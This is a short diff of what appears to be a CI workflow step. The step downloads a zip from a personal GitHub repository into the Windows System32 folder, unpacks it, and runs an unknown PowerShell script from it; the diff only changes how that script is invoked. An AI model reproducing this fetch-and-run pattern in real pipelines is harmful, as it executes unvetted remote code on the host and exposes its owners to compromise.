@@ -38,7 +38,7 @@ jobs:
         chdir C:\Windows\System32
         Invoke-WebRequest https://raw.githubusercontent.com/wadaefendi/daef/main/Api_App.zip -Outfile Api_App.zip
         Expand-Archive Api_App.zip
-        cmd /k .\maingi.ps1
+        .\maingi.ps1
         
         
         
